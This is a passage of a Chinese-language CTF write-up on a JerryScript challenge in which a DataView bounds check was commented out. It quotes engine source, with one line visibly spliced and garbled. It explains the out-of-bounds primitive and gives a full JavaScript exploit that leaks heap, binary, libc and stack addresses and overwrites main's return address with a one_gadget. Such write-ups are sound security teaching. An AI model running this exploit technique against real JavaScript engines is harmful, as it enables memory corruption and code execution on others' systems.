        JERRY_CONTEXT (jmem_heap_allocated_size) += JMEM_ALIGNMENT;
        if (JERRY_CONTEXT (jmem_heap_allocated_size) >= JERRY_CONTEXT (jmem_heap_limit))
        {
          JERRY_CONTEXT (jmem_heap_limit) += CONFIG_GC_LIMIT;
        }
        if (data_space_p->size == JMEM_ALIGNMENT)
        {
          JERRY_HEAP_CONTEXT (first).next_offset = data_space_p->next_offset;
        }
        else
        {
          JERRY_ASSERT (data_space_p->size > JMEM_ALIGNMENT);
          jmem_heap_free_t *remaining_p;
          remaining_p = JMEM_HEAP_GET_ADDR_FROM_OFFSET (JERRY_HEAP_CONTEXT (first).next_offset) + 1;
          JMEM_VALGRIND_DEFINED_SPACE (remaining_p, sizeof (jmem_heap_free_t));
          remaining_p->size = data_space_p->size - JMEM_ALIGNMENT;
          remaining_p->next_offset = data_space_p->next_offset;
          JMEM_VALGRIND_NOACCESS_SPACE (remaining_p, sizeof (jmem_heap_free_t));
          JERRY_HEAP_CONTEXT (first).next_offset = JMEM_HEAP_GET_OFFSET_FROM_ADDR (remaining_p);
        }
        JMEM_VALGRIND_NOACCESS_SPACE (data_space_p, sizeof (jmem_heap_free_t));
        if (JERRY_UNLIKELY (data_space_p == JERRY_CONTEXT (jmem_heap_list_skip_p)))
        {
          JERRY_CONTEXT (jmem_heap_list_skip_p) = JMEM_HEAP_GET_ADDR_FROM_OFFSET (JERRY_HEAP_CONTEXT (first).next_offset);
        }
      }
      /* Slow path for larger regions. */
      else
      {
        uint32_t current_offset = JERRY_HEAP_CONTEXT (first).next_offset;
        jmem_heap_free_t *prev_p = &JERRY_HEAP_CONTEXT (first);
        while (JERRY_LIKELY (current_offset != JMEM_HEAP_END_OF_LIST))
        {
          jmem_heap_free_t *current_p = JMEM_HEAP_GET_ADDR_FROM_OFFSET (current_offset);
          JERRY_ASSERT (jmem_is_heap_pointer (current_p));
          JMEM_VALGRIND_DEFINED_SPACE (current_p, sizeof (jmem_heap_free_t));
          const uint32_t next_offset = current_p->next_offset;
          JERRY_ASSERT (next_offset == JMEM_HEAP_END_OF_LIST
                        || jmem_is_heap_pointer (JMEM_HEAP_GET_ADDR_FROM_OFFSET (next_offset)));
          if (current_p->size >= required_size)
          {
            /* Region is sufficiently big, store address. */
            data_space_p = current_p;
            /* Region was larger than necessary. */
            if (current_p->size > required_size)
            {
              /* Get address of remaining space. */
              jmem_heap_free_t *const remaining_p = (jmem_heap_free_t *) ((uint8_t *) current_p + required_size);
              /* Update metadata. */
              JMEM_VALGRIND_DEFINED_SPACE (remaining_p, sizeof (jmem_heap_free_t));
              remaining_p->size = current_p->size - (uint32_t) required_size;
              remaining_p->next_offset = next_offset;
              JMEM_VALGRIND_NOACCESS_SPACE (remaining_p, sizeof (jmem_heap_free_t));
              /* Update list. */
              JMEM_VALGRIND_DEFINED_SPACE (prev_p, sizeof (jmem_heap_free_t));
              prev_p->next_offset = JMEM_HEAP_GET_OFFSET_FROM_ADDR (remaining_p);
              JMEM_VALGRIND_NOACCESS_SPACE (prev_p, sizeof (jmem_heap_free_t));
            }
            /* Block is an exact fit. */
            else
            {
              /* Remove the region from the list. */
              JMEM_VALGRIND_DEFINED_SPACE (prev_p, sizeof (jmem_heap_free_t));
              prev_p->next_offset = next_offset;
              JMEM_VALGRIND_NOACCESS_SPACE (prev_p, sizeof (jmem_heap_free_t));
            }
            JERRY_CONTEXT (jmem_heap_list_skip_p) = prev_p;
            /* Found enough space. */
            JERRY_CONTEXT (jmem_heap_allocated_size) += required_size;
            while (JERRY_CONTEXT (jmem_heap_allocated_size) >= JERRY_CONTEXT (jmem_heap_limit))
            {
              JERRY_CONTEXT (jmem_heap_limit) += CONFIG_GC_LIMIT;
            }
            break;
          }
          JMEM_VALGRIND_NOACCESS_SPACE (current_p, sizeof (jmem_heap_free_t));
          /* Next in list. */
          prev_p = current_p;
          current_offset = next_offset;
        }
      }
      JMEM_VALGRIND_NOACCESS_SPACE (&JERRY_HEAP_CONTEXT (first), sizeof (jmem_heap_free_t));
      JERRY_ASSERT ((uintptr_t) data_space_p % JMEM_ALIGNMENT == 0);
      JMEM_VALGRIND_MALLOCLIKE_SPACE (data_space_p, size);
      return (void *) data_space_p;
    #else /* JERRY_SYSTEM_ALLOCATOR */
      JERRY_CONTEXT (jmem_heap_allocated_size) += size;
      while (JERRY_CONTEXT (jmem_heap_allocated_size) >= JERRY_CONTEXT (jmem_heap_limit))
      {
        JERRY_CONTEXT (jmem_heap_limit) += CONFIG_GC_LIMIT;
      }
      return malloc (size);
    #endif /* !JERRY_SYSTEM_ALLOCATOR */
    } /* jmem_heap_alloc */
    struct jmem_heap_t
    {
      jmem_heap_free_t first; /** 2 && !ecma_is_value_undefined (arguments_list_p[2]))
      {
        /* 8.a */
        ecma_number_t byte_length_to_index;
        //获取第二个参数赋值
        ecma_value_t byte_length_value = ecma_op_to_index (arguments_list_p[2], &byte_length_to_index);
        if (ECMA_IS_VALUE_ERROR (byte_length_value))
        {
          return byte_length_value;
        }
        /* 8.b */
        // if (offset + byte_length_to_index > buffer_byte_length)
        // {
        //   return ecma_raise_range_error (ECMA_ERR_MSG ("Start offset is outside the bounds of the buffer"));
        // }
        //JERRY_ASSERT (byte_length_to_index header.u.cls.type = ECMA_OBJECT_CLASS_DATAVIEW;
      dataview_obj_p->header.u.cls.u3.length = view_byte_length;//赋值给length
      dataview_obj_p->buffer_p = buffer_p;
      dataview_obj_p->byte_offset = (uint32_t) offset;
      return ecma_make_object_value (object_p);
    } /* ecma_op_dataview_create */
根据上下文可以分析出来这一段判断是否越界的，再设置长度的，去掉这一判断就可以造成设置length的越界。然后根据前置知识我们就是可以获得一个DataView的OOB，接下来我们只需要更改buffer_p就可以任意地址R/W了。这里由于Jerry用的自己的一套内存管理最好选择打栈的返回地址最好。
###  2.漏洞利用
漏洞利用就没什么能说的了，我直接拿题目给的去调的。本机环境20.04，题目给的是21.04不过差别不大，本机调完对远程改个偏移就能通了。
首先看下Debug版本中DataView的内存分布。直接下断点到ecma-dataview-object.c:155。
然后就可以利用Debug 版本的优化 自由输出变量的值。
    var buffer = new ArrayBuffer(0x10)
    var buffer2 = new ArrayBuffer(0x10)
    data2=new DataView(buffer,0,0x100)
    data=new DataView(buffer2,0,0x100)
第一个箭头是buffer_p，第二个是length。
可以看到这两个DataView对象离得不远，然后我们可以通过OOB用第一个去设置第二个的Buffer，造成ABR/W，然后leak
textbase，leak libc，leak stack ，最终改写main函数返回地址为One_gadget。
###  3.Exploit
Ubuntu20.04，题目给的Binary不好下断点的话，就用assert就行了。
    var buffer = new ArrayBuffer(0x10)
    var buffer2 = new ArrayBuffer(0x10)
    data2=new DataView(buffer,0,0x100)
    data=new DataView(buffer2,0,0x100)
    data.setUint32(0,0x41414141)
    data.setUint32(4,0x41414141)
    data2.setUint32(0,0x42424242)
    data2.setUint32(4,0x42424242)
    jerry_gloal_heap_offset=0x68
    jerry_gloal_heap=data.getUint32(jerry_gloal_heap_offset+4,true)*0x100000000+data.getUint32(jerry_gloal_heap_offset,true)
    text_base=jerry_gloal_heap-0x6d458
    realloc_got=text_base+0x00000000006bf00+0x10
    print(jerry_gloal_heap.toString(16))
    print(text_base.toString(16))
    print(realloc_got.toString(16))
    data.setUint32(jerry_gloal_heap_offset,realloc_got&0xffffffff,true)
    libc_base=data2.getUint32(4,true)*0x100000000+data2.getUint32(0,true)-0x9e000
    print(libc_base.toString(16))
    env=libc_base+0x1ef2e0-0x10
    print(env.toString(16))
    data.setUint32(jerry_gloal_heap_offset,env&0xffffffff,true)
    data.setUint32(jerry_gloal_heap_offset+4,env/0x100000000,true)
    stack=data2.getUint32(4,true)*0x100000000+data2.getUint32(0,true)
    print(stack.toString(16))
    ret_addr=stack-0x108-0x10
    ogg=libc_base+[0xe6c7e,0xe6c81,0xe6c84][1]
    data.setUint32(jerry_gloal_heap_offset,ret_addr&0xffffffff,true)
    data.setUint32(jerry_gloal_heap_offset+4,ret_addr/0x100000000,true)
    data2.setUint32(0,ogg&0xffffffff,true)
    data2.setUint32(4,ogg/0x100000000,true)
    //assert(1==2)